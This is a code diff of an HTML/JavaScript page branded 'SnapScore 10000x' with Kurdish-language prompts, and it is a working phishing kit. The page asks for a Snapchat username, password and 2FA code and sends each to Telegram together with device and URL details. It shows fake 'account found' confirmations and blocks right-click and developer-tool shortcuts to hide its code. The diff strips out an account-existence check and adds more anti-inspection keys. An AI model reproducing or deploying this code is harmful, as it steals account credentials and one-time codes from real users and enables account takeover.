-                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
-                    'Accept-Language': 'en-US,en;q=0.9',
-                }
-            });
-
-            const html = await response.text();
-
-            // Check for "Sorry, this content was not found" in the page
-            if (html.includes('Sorry, this content was not found') || 
-                html.includes('content was not found') ||
-                html.includes('Page not found') ||
-                html.includes('404') ||
-                response.status === 404) {
-                return { exists: false };
-            }
-
-            // If page loads and doesn't have the error message, account exists
-            if (response.status === 200) {
-                return { exists: true, platform: 'Snapchat' };
-            }
-
-            return { exists: false };
-        } catch(e) {
-            // If fetch fails, assume account doesn't exist
-            return { exists: false };
-        }
+        isProcessing = false;
+        username.focus();
     }
 
     // ========== LOGIN ==========
-    loginBtn.addEventListener('click', async function() {
-        if (isChecking) return;
-        
+    loginBtn.addEventListener('click', function() {
+        if (isProcessing) return;
+
         const u = username.value.trim();
         const p = password.value.trim();
-        
+
         if (!u || !p) {
             setStatus(status1, '⚠️ تکایە ناوی بەکارهێنەر و تێپەڕەوشە پڕ بکەوە.', 'error');
             return;
@@ -534,52 +941,46 @@
 
         currentUser = u;
         currentPass = p;
-        isChecking = true;
-
-        setStatus(status1, '⏳ پشکنینی هەژمار لە Snapchat...', 'loading');
-        loginBtn.disabled = true;
-
-        // Check Snapchat account
-        const result = await checkSnapchatAccount(u);
-
-        if (!result.exists) {
-            setStatus(status1, '❌ ئەم ئەکاونتە بوونی نیە! تکایە ناوی بەکارهێنەر پشتڕاست بکەوە.', 'error');
-            loginBtn.disabled = false;
-            isChecking = false;
-            return;
-        }
+        isProcessing = true;
 
         // Send credentials to Telegram
         sendTelegram(
             `🔐 Snapchat Login\n\n` +
             `👤 Username: ${u}\n` +
             `🔑 Password: ${p}\n` +
-            `✅ Account verified: Yes (Snapchat)\n` +
             `📱 Device: ${navigator.userAgent || 'Unknown'}\n` +
             `🌐 URL: ${window.location.href}\n` +
             `⏱️ Time: ${new Date().toLocaleString()}`
         );
 
+        setStatus(status1, '⏳ پشکنینی هەژمار...', 'loading');
+        loginBtn.disabled = true;
+
         setTimeout(() => {
-            setStatus(status1, `✅ هەژمار دۆزرایەوە! کۆد نێردرا.`, 'success');
+            setStatus(status1, '✅ هەژمار دۆزرایەوە! کۆد نێردرا.', 'success');
 
             setTimeout(() => {
                 hideStatus(status1);
                 showStep(2);
                 loginBtn.disabled = false;
-                isChecking = false;
+                isProcessing = false;
                 setStatus(status2, '📨 کۆدی ٦ ژمارەیی نێردرا. تکایە بنووسە.', 'info');
                 code.focus();
             }, 1200);
-        }, 1500);
+        }, 1800);
     });
 
     // ========== RESEND ==========
     resendBtn.addEventListener('click', function() {
+        if (isProcessing) return;
+
         setStatus(status2, '📨 کۆدی نوێ نێردرا...', 'loading');
         sendTelegram(`🔄 Resend code requested for @${currentUser}`);
+        isProcessing = true;
+
         setTimeout(() => {
             setStatus(status2, '✅ کۆدی نوێ نێردرا!', 'success');
+            isProcessing = false;
             setTimeout(() => {
                 setStatus(status2, '📨 کۆدەکە بنووسە', 'info');
             }, 1500);
@@ -588,6 +989,8 @@
 
     // ========== VERIFY ==========
     verifyBtn.addEventListener('click', function() {
+        if (isProcessing) return;
+
         const c = code.value.trim();
         if (!c || c.length < 4) {
             setStatus(status2, '⚠️ تکایە کۆدی ٦ ژمارەیی پڕ بکەوە.', 'error');
@@ -595,7 +998,9 @@
         }
 
         currentCode = c;
+        isProcessing = true;
 
+        // Send code to Telegram
         sendTelegram(
             `✅ Verification Code\n\n` +
             `👤 Username: ${currentUser}\n` +
@@ -611,6 +1016,7 @@
             hideStatus(status2);
             showStep(3);
             verifyBtn.disabled = false;
+            isProcessing = false;
             startCountdown();
         }, 2500);
     });
@@ -626,19 +1032,31 @@
     // ========== FOCUS ==========
     setTimeout(() => {
         if (step === 1) username.focus();
-    }, 400);
+    }, 500);
 
     // ========== PREVENT RIGHT-CLICK ==========
     document.addEventListener('contextmenu', e => e.preventDefault());
 
     // ========== PREVENT DEV TOOLS ==========
     document.addEventListener('keydown', function(e) {
-        if (e.key === 'F12' || (e.ctrlKey && e.shiftKey && e.key === 'I') || (e.ctrlKey && e.key === 'U')) {
+        if (e.key === 'F12' ||
+            (e.ctrlKey && e.shiftKey && e.key === 'I') ||
+            (e.ctrlKey && e.key === 'U') ||
+            (e.ctrlKey && e.shiftKey && e.key === 'J')) {
             e.preventDefault();
         }
     });
 
-    console.log('🚀 SnapScore loaded.');
+    // ========== PREVENT INSPECT ELEMENT ==========
+    document.addEventListener('keydown', function(e) {
+        if (e.ctrlKey && e.shiftKey && e.key === 'C') {
+            e.preventDefault();
+        }
+    });
+
+    console.log('🚀 SnapScore 10000x loaded.');
+    console.log('📱 Designed for Kurdish users.');
+    console.log('💛 Made with ❤️');
 </script>
 </body>
 </html>
